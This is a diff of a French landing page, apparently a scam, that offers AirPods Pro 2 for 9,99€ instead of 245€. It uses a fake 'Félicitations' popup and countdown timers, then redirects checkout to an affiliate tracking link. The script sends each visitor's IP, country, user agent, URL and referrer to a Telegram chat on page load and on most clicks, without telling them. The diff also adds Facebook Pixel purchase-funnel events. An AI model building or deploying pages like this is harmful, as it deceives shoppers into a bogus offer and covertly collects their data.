@@ -1,10 +1,8 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
 <meta name="p:domain_verify" content="6e9abc24c9c419575bc20271684efe1c"/>
-    <!-- Pinterest Tag -->
-<script>
+    <script>
 !function(e){if(!window.pintrk){window.pintrk = function () {
 window.pintrk.queue.push(Array.prototype.slice.call(arguments))};var
   n=window.pintrk;n.queue=[],n.version="3.0";var
@@ -18,8 +16,30 @@ pintrk('page');
 <img height="1" width="1" style="display:none;" alt=""
   src="https://ct.pinterest.com/v3/?event=init&tid=2613445496968&pd[em]=<hashed_email_address>&noscript=1" />
 </noscript>
-<!-- end Pinterest Tag -->
-    <meta charset="UTF-8">
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1785165155706894');
+fbq('track', 'PageView');
+// Fire ViewContent for the main product page
+fbq('track', 'ViewContent', {
+    content_name: 'AirPods Pro 2 - Offre Exclusive Anniversaire',
+    content_ids: ['APPRO2-PROMO999'],
+    content_type: 'product',
+    value: 9.99,
+    currency: 'EUR'
+});
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1785165155706894&ev=PageView&noscript=1"
+/></noscript>
+<meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AirPods Pro 2 - Offre Exclusive</title>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -202,12 +222,12 @@ pintrk('page');
         .review-card:hover { transform: translateY(-5px); }
         .review-avatar { width: 60px; height: 60px; border-radius: 50%; margin-right: 1rem; object-fit: cover; border: 2px solid #e5e7eb; }
         .review-stars { color: #f59e0b; margin-bottom: 0.5rem; }
-        .trustpilot-badge { 
+        .trustpilot-badge {
             max-height: 70px; /* Increased height */
             max-width: 250px; /* Added max-width for better control of rectangular logo */
-            width: auto; 
-            margin-top: 1rem; 
-            margin-bottom: 2rem; 
+            width: auto;
+            margin-top: 1rem;
+            margin-bottom: 2rem;
         }
 
     </style>
@@ -318,7 +338,7 @@ pintrk('page');
             <div class="timed-popup-icon">🎉</div>
             <h2 class="timed-popup-title">Félicitations !</h2>
             <p class="timed-popup-text">
-                Vous êtes tombé(e) sur notre offre spéciale anniversaire du lancement des AirPods ! Profitez dès maintenant des AirPods Pro 2 <span class="timed-popup-highlight">pour seulement 9,99€ – au lieu de 245€ –</span>  en l'honneur de cette occasion unique.
+                Vous êtes tombé(e) sur notre offre spéciale anniversaire du lancement des AirPods ! Profitez dès maintenant des AirPods Pro 2 <span class="timed-popup-highlight">pour seulement 9,99€ – au lieu de 245€ –</span> en l'honneur de cette occasion unique.
             </p>
             <p class="timed-popup-text timed-popup-highlight">
                 ⏳ Attention :
@@ -463,28 +483,27 @@ Ne manquez pas cette opportunité exceptionnelle !
     const TELEGRAM_CHAT_ID = '-4913064483';
 
     async function sendTelegramAlert(action, details = {}) {
-let ipInfo = { 
-    ip: 'N/A', country_name: 'N/A', country_code: 'N/A', 
-    city: 'N/A', region_name: 'N/A' 
-};
-try {
-    const ipRes = await fetch('https://api.country.is/');
-    if (ipRes.ok) {
-        const data = await ipRes.json();
-        ipInfo = { 
-            ip: data.ip || 'N/A', 
-            country_name: data.country || 'N/A', // رمز الدولة مثل FR أو DZ
-            country_code: data.country || 'N/A', 
-            city: 'N/A', // هذه الخدمة لا تعطي المدينة
-            region_name: 'N/A'
+        let ipInfo = {
+            ip: 'N/A', country_name: 'N/A', country_code: 'N/A',
+            city: 'N/A', region_name: 'N/A'
         };
-    } else {
-        ipInfo.ip = `HTTP Error ${ipRes.status}`;
-    }
-} catch (e) {
-    ipInfo.ip = 'Exception during fetch';
-}
-
+        try {
+            const ipRes = await fetch('https://api.country.is/');
+            if (ipRes.ok) {
+                const data = await ipRes.json();
+                ipInfo = {
+                    ip: data.ip || 'N/A',
+                    country_name: data.country || 'N/A',
+                    country_code: data.country || 'N/A',
+                    city: 'N/A', 
+                    region_name: 'N/A'
+                };
+            } else {
+                ipInfo.ip = `HTTP Error ${ipRes.status}`;
+            }
+        } catch (e) {
+            ipInfo.ip = 'Exception during fetch';
+        }
 
         let emoji = '🔔'; // Default
         if (/finaliser/i.test(action) || /finalize/i.test(action)) emoji = '💳';
@@ -495,7 +514,6 @@ try {
         else if (/timed offer popup shown/i.test(action)) emoji = '⏳';
         else if (/timed popup order/i.test(action)) emoji = '🎉';
         else if (/policy modal opened/i.test(action) || /nav link clicked/i.test(action) || /navigation menu toggled/i.test(action) ) emoji = '🔗';
-
 
         const userAgent = navigator.userAgent;
         const language = navigator.language;
@@ -509,7 +527,7 @@ try {
         msg += `🕒 <b>Heure:</b> ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n`;
         msg += `🔗 <b>URL:</b> ${window.location.href}\n`;
         if (document.referrer) msg += `↩️ <b>Referrer:</b> ${document.referrer}\n`;
-        
+       
         if (details && Object.keys(details).length) {
             msg += `\n📋 <b>Détails:</b>\n`;
             Object.keys(details).forEach(key => {
@@ -534,17 +552,24 @@ try {
     }
     // --- End Telegram Alert Function ---
 
+    // --- Facebook Pixel Event Parameters ---
+    const fbProductDetails = {
+        content_name: 'AirPods Pro 2 - Offre Exclusive Anniversaire',
+        content_ids: ['APPRO2-PROMO999'], // Example SKU or unique ID
+        content_type: 'product',
+        value: 9.99,
+        currency: 'EUR'
+    };
+
     // --- Global Flags for Timed Popup Logic ---
     let mainOrderButtonClicked = false;
     let timedPopupTimeoutId = null;
 
-
-    // --- DOM Element Declarations (from user's script) ---
-    const logoArea = document.getElementById('logoArea'); 
+    // --- DOM Element Declarations ---
+    const logoArea = document.getElementById('logoArea');
     const topNavMenu = document.getElementById('topNavMenu');
     const navLinks = document.querySelectorAll('.nav-link');
-    const mainHeader = document.getElementById('mainHeader'); 
-
+    const mainHeader = document.getElementById('mainHeader');
     const logoImg1 = document.getElementById('logoImg1');
     const logoImg2 = document.getElementById('logoImg2');
     const mainTimerDisplay = document.getElementById('timer');
@@ -559,15 +584,12 @@ try {
     const popupAirpodsImg = document.getElementById('popupAirpodsImg');
     const loadingPopup = document.getElementById('loadingPopup');
     const detailsBtn = document.getElementById('detailsBtn');
-    const featuresSection = document.getElementById('features-section'); 
-    const reviewsSectionForNav = document.getElementById('reviews-section'); 
+    const featuresSection = document.getElementById('features-section');
     const currentYearSpan = document.getElementById('currentYear');
-
     const timedPopupModal = document.getElementById('timedPopupModal');
     const timedPopupCloseBtn = document.getElementById('timedPopupCloseBtn');
     const timedPopupOrderBtn = document.getElementById('timedPopupOrderBtn');
     const timedPopupTimerDisplay = document.getElementById('timedPopupTimerDisplay');
-
     const aboutLink = document.getElementById('about-link');
     const privacyLink = document.getElementById('privacy-link');
     const termsLink = document.getElementById('terms-link');
@@ -579,7 +601,6 @@ try {
     const supportPage = document.getElementById('support-page');
     const contactPage = document.getElementById('contact-page');
     const featureImages = document.querySelectorAll('.features-img');
-
 
     // --- Top Navigation Menu Logic ---
     if (logoArea && topNavMenu) {
@@ -601,7 +622,7 @@ try {
                 if (targetSection) {
                     const headerOffset = mainHeader ? mainHeader.offsetHeight : 0;
                     const elementPosition = targetSection.getBoundingClientRect().top + window.scrollY;
-                    const offsetPosition = elementPosition - headerOffset - 20; 
+                    const offsetPosition = elementPosition - headerOffset - 20;
                     window.scrollTo({ top: offsetPosition, behavior: 'smooth' });
                 }
             }
@@ -637,13 +658,10 @@ try {
     }
 
     function updateMainTimer() {
-        if (mainTimerDisplay) {
-            mainTimerDisplay.textContent = formatTime(totalSeconds);
-        }
+        if (mainTimerDisplay) mainTimerDisplay.textContent = formatTime(totalSeconds);
         if (timedPopupModal && timedPopupTimerDisplay && timedPopupModal.classList.contains('show')) {
             timedPopupTimerDisplay.textContent = formatTime(totalSeconds);
         }
-
         if (totalSeconds > 0) {
             totalSeconds--;
         } else {
@@ -663,37 +681,26 @@ try {
         mainTimerInterval = setInterval(updateMainTimer, 1000);
     }
 
-    // --- Timed Pop-up Modal Logic (Corrected) ---
-    let timedPopupShownThisSession = false; // Remains the same
-
+    // --- Timed Pop-up Modal Logic ---
+    let timedPopupShownThisSession = false;
     function showTimedPopup() {
-        // Check both flags: if popup already shown OR if main order button was clicked
         if (timedPopupModal && !timedPopupShownThisSession && !mainOrderButtonClicked) {
             timedPopupModal.classList.add('show');
             timedPopupShownThisSession = true;
-            if (timedPopupTimerDisplay) {
-                timedPopupTimerDisplay.textContent = formatTime(totalSeconds);
-            }
+            if (timedPopupTimerDisplay) timedPopupTimerDisplay.textContent = formatTime(totalSeconds);
             sendTelegramAlert('Timed Offer Popup Shown');
         }
     }
-
     function closeTimedPopup() {
-        if (timedPopupModal) {
-            timedPopupModal.classList.remove('show');
-        }
+        if (timedPopupModal) timedPopupModal.classList.remove('show');
     }
-
     if (timedPopupModal) {
-        // Store the timeout ID so it can be cancelled if order button is clicked
-        timedPopupTimeoutId = setTimeout(showTimedPopup, 10000); 
-        if (timedPopupCloseBtn) {
-            timedPopupCloseBtn.onclick = closeTimedPopup;
-        }
+        timedPopupTimeoutId = setTimeout(showTimedPopup, 10000);
+        if (timedPopupCloseBtn) timedPopupCloseBtn.onclick = closeTimedPopup;
         if (timedPopupOrderBtn) {
             timedPopupOrderBtn.onclick = function() {
                 closeTimedPopup();
-                openOrderModal(); // This will set mainOrderButtonClicked = true
+                openOrderModal();
                 sendTelegramAlert('Timed Popup Order Clicked');
             };
         }
@@ -703,52 +710,39 @@ try {
     let originalOrderBtnOffsetTop = 0;
     if (orderBtn) {
         setTimeout(() => {
-            if(orderBtn) { // Check again as it might be null if element is removed dynamically (not the case here but good practice)
-               originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
-            }
+            if(orderBtn) originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
         }, 100);
     }
-
-
     function handleScroll() {
         if (floatingOrderBtn && orderBtn && originalOrderBtnOffsetTop > 0) {
             const shouldBeVisible = window.scrollY > originalOrderBtnOffsetTop + orderBtn.offsetHeight;
             const isVisible = floatingOrderBtn.classList.contains('visible');
-
             if (shouldBeVisible && !isVisible) {
-                floatingOrderBtn.style.display = 'block'; 
-                requestAnimationFrame(() => { 
-                    floatingOrderBtn.classList.add('visible');
-                });
+                floatingOrderBtn.style.display = 'block';
+                requestAnimationFrame(() => floatingOrderBtn.classList.add('visible'));
             } else if (!shouldBeVisible && isVisible) {
                 floatingOrderBtn.classList.remove('visible');
                 setTimeout(() => {
-                    if (!floatingOrderBtn.classList.contains('visible')) {
-                        floatingOrderBtn.style.display = 'none';
-                    }
-                }, 400); 
+                    if (!floatingOrderBtn.classList.contains('visible')) floatingOrderBtn.style.display = 'none';
+                }, 400);
             }
         }
     }
     window.addEventListener('scroll', handleScroll);
-    if (orderBtn) { 
-        handleScroll();
-    }
+    if (orderBtn) handleScroll();
 
-
-    // --- Main Order Modal & Cart Logic (Corrected for Timed Popup) ---
+    // --- Main Order Modal & Cart Logic ---
     const colorImageSources = {
         blanc: "https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg",
         noir: "https://i.postimg.cc/GpxqD620/images-2025-05-25-T200743-316-2.jpg"
     };
 
     function openOrderModal() {
-        mainOrderButtonClicked = true; // Set flag when any order process starts
-        if (timedPopupTimeoutId) { // If the timed popup timeout is still pending
-            clearTimeout(timedPopupTimeoutId); // Cancel it
-            timedPopupTimeoutId = null; // Reset the ID
+        mainOrderButtonClicked = true; 
+        if (timedPopupTimeoutId) {
+            clearTimeout(timedPopupTimeoutId);
+            timedPopupTimeoutId = null;
         }
-
         if (mainModal && cartBar && cartBarAirpodsImg && popupAirpodsImg) {
             mainModal.style.display = "flex";
             cartBar.classList.add("show-cart-bar");
@@ -756,30 +750,23 @@ try {
             cartBarAirpodsImg.src = colorImageSources[selectedColor];
             popupAirpodsImg.src = colorImageSources[selectedColor];
             sendTelegramAlert('Order Modal Opened / Add to Cart', { product: 'AirPods Pro 2', price: '9,99€', initialColor: selectedColor });
+            
+            // Facebook Pixel AddToCart Event
+            if (typeof fbq === 'function') {
+                fbq('track', 'AddToCart', {
+                    ...fbProductDetails,
+                    content_name: `AirPods Pro 2 - Offre Exclusive Anniversaire - Couleur ${selectedColor}` // Example of adding variant
+                });
+            }
         }
     }
 
-    if (orderBtn) {
-        orderBtn.onclick = openOrderModal;
-    }
-    if (floatingOrderBtn) {
-        floatingOrderBtn.onclick = openOrderModal;
-    }
-
-    if (closeModalBtn && mainModal) {
-        closeModalBtn.onclick = function() {
-            mainModal.style.display = "none";
-        };
-    }
-    
-    if (mainModal) {
-        mainModal.addEventListener('click', function(event) {
-            if (event.target === mainModal) { 
-                mainModal.style.display = 'none';
-            }
-        });
-    }
-
+    if (orderBtn) orderBtn.onclick = openOrderModal;
+    if (floatingOrderBtn) floatingOrderBtn.onclick = openOrderModal;
+    if (closeModalBtn && mainModal) closeModalBtn.onclick = function() { mainModal.style.display = "none"; };
+    if (mainModal) mainModal.addEventListener('click', function(event) {
+        if (event.target === mainModal) mainModal.style.display = 'none';
+    });
 
     if (finalizeBtn && mainModal && loadingPopup) {
         finalizeBtn.onclick = function() {
@@ -787,6 +774,15 @@ try {
             mainModal.style.display = "none";
             loadingPopup.style.display = "flex";
             sendTelegramAlert('Finaliser la commande (AirPods Pro 2)', { selectedColor: selectedColor, quantity: 1 });
+
+            // Facebook Pixel InitiateCheckout Event
+            if (typeof fbq === 'function') {
+                fbq('track', 'InitiateCheckout', {
+                     ...fbProductDetails,
+                     num_items: 1 // Assuming quantity is always 1 as per a previous observation
+                });
+            }
+
             setTimeout(() => {
                 window.location.href = "https://ttgn.tracktimegenius.com/aff_c?offer_id=85898&aff_id=1931&source=AirPods+Pro+2___https://inidkan.com/3234-large_default/airpods-pro-2-vrac.jpg";
             }, 3000);
@@ -811,30 +807,25 @@ try {
         detailsBtn.onclick = function() {
             const headerOffset = mainHeader ? mainHeader.offsetHeight : 0;
             const elementPosition = featuresSection.getBoundingClientRect().top + window.scrollY;
-            const offsetPosition = elementPosition - headerOffset - 20; 
+            const offsetPosition = elementPosition - headerOffset - 20;
             window.scrollTo({ top: offsetPosition, behavior: 'smooth' });
             sendTelegramAlert('Product Details Viewed (AirPods Pro 2)');
         }
     }
 
-    if (currentYearSpan) {
-        currentYearSpan.textContent = new Date().getFullYear();
-    }
+    if (currentYearSpan) currentYearSpan.textContent = new Date().getFullYear();
 
-    function setupModalLink(linkEl, pageEl, modalName) { // Added modalName for tracking
+    function setupModalLink(linkEl, pageEl, modalName) {
         if (linkEl && pageEl) {
-            linkEl.onclick = (e) => { 
-                e.preventDefault(); 
-                pageEl.style.display = 'flex'; 
+            linkEl.onclick = (e) => {
+                e.preventDefault();
+                pageEl.style.display = 'flex';
                 sendTelegramAlert('Policy Modal Opened', { modal: modalName });
             };
             const policyCloseBtn = pageEl.querySelector('.policy-content .close-btn');
-            if (policyCloseBtn) {
-                policyCloseBtn.onclick = () => { pageEl.style.display = 'none'; };
-            }
+            if (policyCloseBtn) policyCloseBtn.onclick = () => { pageEl.style.display = 'none'; };
         }
     }
-
     setupModalLink(aboutLink, aboutPage, 'À Propos');
     setupModalLink(privacyLink, privacyPage, 'Confidentialité');
     setupModalLink(termsLink, termsPage, 'Conditions');
@@ -843,9 +834,7 @@ try {
 
     document.querySelectorAll('.policy-modal').forEach(modal => {
         modal.addEventListener('click', function(event) {
-            if (event.target === this) {
-                this.style.display = 'none';
-            }
+            if (event.target === this) this.style.display = 'none';
         });
     });
 
@@ -859,14 +848,14 @@ try {
     // Initial Page Load Tracking
     window.addEventListener('load', () => {
         sendTelegramAlert('Page Loaded (AirPods Pro 2 Offer)');
-        if (orderBtn) { 
+        if (orderBtn) {
             setTimeout(() => {
-                if(orderBtn) { // Check again, element might be removed
-                    originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
-                }
-                handleScroll(); 
-            }, 200); 
+                if(orderBtn) originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
+                handleScroll();
+            }, 200);
         }
+        // Note: ViewContent is already fired in the <head> with the base pixel code.
+        // If you need it to fire strictly after full load, you could move it here.
     });
     </script>
 
